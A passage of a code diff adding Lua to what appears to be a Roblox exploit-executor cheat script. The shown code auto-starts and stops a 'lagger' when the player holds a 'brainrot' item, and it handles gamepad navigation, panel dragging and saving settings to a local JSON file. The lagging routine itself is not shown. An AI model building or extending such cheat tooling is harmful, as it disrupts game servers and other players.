+		if not autoBrainrot then
+			offTimer = 0
+			wasHeld = false
+			brainrotHeld = false
+			if running and autoStarted then
+				stopLagger()
+			end
+		else
+			local held = holdingBrainrot(dt)
+			brainrotHeld = held
+
+			if held then
+				offTimer = 0
+				if not wasHeld then
+					wasHeld = true
+					if not running then
+						startLagger("auto")
+					end
+				end
+			elseif wasHeld then
+				offTimer = offTimer + dt
+				if offTimer >= BRAINROT_OFF_DELAY then
+					wasHeld = false
+					offTimer = 0
+					-- dropping the brainrot always ends the run while AUTO is on
+					if running then
+						stopLagger()
+					end
+				end
+			else
+				offTimer = 0
+			end
+		end
+	end
+end)
+
+--==============================================================
+-- GAMEPAD UI NAVIGATION
+--==============================================================
+GuiService.AutoSelectGuiEnabled = true
+
+UserInputService.LastInputTypeChanged:Connect(function(inputType)
+	if string.find(tostring(inputType), "Gamepad") and GuiService.SelectedObject == nil then
+		GuiService.SelectedObject = startBtn
+	end
+end)
+
+--==============================================================
+-- DRAGGING
+--==============================================================
+local panelPos
+local dragStart
+
+dragBar.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+		or input.UserInputType == Enum.UserInputType.Touch
+	then
+		dragging = true
+		dragStart = input.Position
+		panelPos = panel.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+				if queueSave then
+					queueSave()
+				end
+			end
+		end)
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if not dragging then
+		return
+	end
+	if input.UserInputType == Enum.UserInputType.MouseMovement
+		or input.UserInputType == Enum.UserInputType.Touch
+	then
+		local delta = input.Position - dragStart
+		panel.Position = UDim2.new(
+			panelPos.X.Scale,
+			panelPos.X.Offset + delta.X,
+			panelPos.Y.Scale,
+			panelPos.Y.Offset + delta.Y
+		)
+	end
+end)
+
+--==============================================================
+-- AUTO SAVE (built into the script)
+--==============================================================
+local saveToken = 0
+
+function saveConfig()
+	if type(writefile) ~= "function" then
+		return
+	end
+	local ok, data = pcall(function()
+		return HttpService:JSONEncode({
+			version = 4,
+			name = TITLE_TEXT,
+			power = power,
+			powerText = powerBox.Text,
+			keybind = { kind = bind.kind, code = bind.code, label = bind.label },
+			autoBrainrot = autoBrainrot,
+			timeLimit = timeLimit,
+			position = {
+				x = math.floor(panel.Position.X.Offset),
+				y = math.floor(panel.Position.Y.Offset),
+			},
+			collapsed = collapsed,
+		})
+	end)
+	if ok and type(data) == "string" then
+		pcall(writefile, CFG_FILE, data)
+	end
+end
+
+function queueSave()
+	if type(writefile) ~= "function" then
+		return
+	end
+	saveToken = saveToken + 1
+	local mine = saveToken
+	task.delay(AUTOSAVE, function()
+		if mine == saveToken then
+			saveConfig()
+		end
+	end)
+end
+
+function loadConfig()
+	if type(isfile) ~= "function" or type(readfile) ~= "function" then
+		return false
+	end
+	local okFile, hasFile = pcall(isfile, CFG_FILE)
+	if not okFile or not hasFile then
+		return false
+	end
+	local ok, data = pcall(function()
+		return HttpService:JSONDecode(readfile(CFG_FILE))
+	end)
+	if not ok or type(data) ~= "table" then
+		return false
+	end
+
+	local restored
+	if type(data.powerText) == "string" then
+		restored = parsePower(data.powerText)
+	end
+	if not restored and tonumber(data.power) then
+		restored = parsePower(data.power)
+	end
+	if restored then
+		power = restored
+	end
+	if type(data.powerText) == "string" and data.powerText ~= "" then
+		powerBox.Text = data.powerText
+	else
+		powerBox.Text = formatPower(power)
+	end
+	powerChip.Text = formatPower(power)
+
+	if type(data.keybind) == "table" then
+		local kind = data.keybind.kind
+		local code = data.keybind.code
+		local label = data.keybind.label
+		if kind == "none" then
+			setBind("none", "None", "NONE", false)
+		elseif kind == "mouse" and type(code) == "string" and Enum.UserInputType[code] then
+			setBind("mouse", code, tostring(label or code), false)
+		elseif type(code) == "string" and code ~= "" then
+			local real = Enum.KeyCode[code]
+			if real then
+				setBind("key", code, tostring(label or friendlyKey(code)), false)
+			end
+		end
+	end
+
+	if data.autoBrainrot ~= nil then
+		autoBrainrot = (data.autoBrainrot == true)
+		refreshAuto(false)
+	end
+
+	if data.timeLimit ~= nil then
+		local t = tonumber(data.timeLimit)
+		if t then
+			timeLimit = math.floor(clamp(t, 0, MAX_TIME))
+			timeBox.Text = formatTime(timeLimit)
+			timeBox.TextColor3 = (timeLimit > 0) and C.white or C.dim
+		end
+	end
+
+	local pos = data.position
+	if type(pos) == "table" and tonumber(pos.x) and tonumber(pos.y) then
+		panel.Position = UDim2.fromOffset(math.floor(tonumber(pos.x)), math.floor(tonumber(pos.y)))
+	end
+
+	if data.collapsed == true then
+		setCollapsed(true, true)
+	end
+
+	return true
+end
+
+--==============================================================
+-- PLACE PANEL + START
+--==============================================================
+local function defaultPlace()
+	local camera = workspace.CurrentCamera
+	local viewport = camera and camera.ViewportSize or Vector2.new(1280, 720)
+	panel.Position = UDim2.fromOffset(
+		math.floor(viewport.X / 2 - PANEL_W / 2),
+		math.floor(viewport.Y / 2 - H_OPEN / 2)
+	)
+end
+
+defaultPlace()
+
+task.spawn(function()
+	local loaded = false
+	local ok, result = pcall(loadConfig)
+	if ok then
+		loaded = result
+	end
+	if not loaded then
+		powerBox.Text = formatPower(power)
+		powerChip.Text = formatPower(power)
+		timeBox.Text = formatTime(timeLimit)
+	end
+
+	local camera = workspace.CurrentCamera
+	local viewport = camera and camera.ViewportSize or Vector2.new(1280, 720)
+	local pos = panel.Position
+	local height = collapsed and H_CLOSED or H_OPEN
+	local x = clamp(pos.X.Offset, -PANEL_W + 70, viewport.X - 70)
+	local y = clamp(pos.Y.Offset, 0, viewport.Y - height - 4)
+	panel.Position = UDim2.fromOffset(math.floor(x), math.floor(y))
+end)
+
+setRunningVisuals(false)
+refreshKeyButton()
+refreshAuto(false)
+timeBox.Text = formatTime(timeLimit)
+timeBox.TextColor3 = (timeLimit > 0) and C.white or C.dim
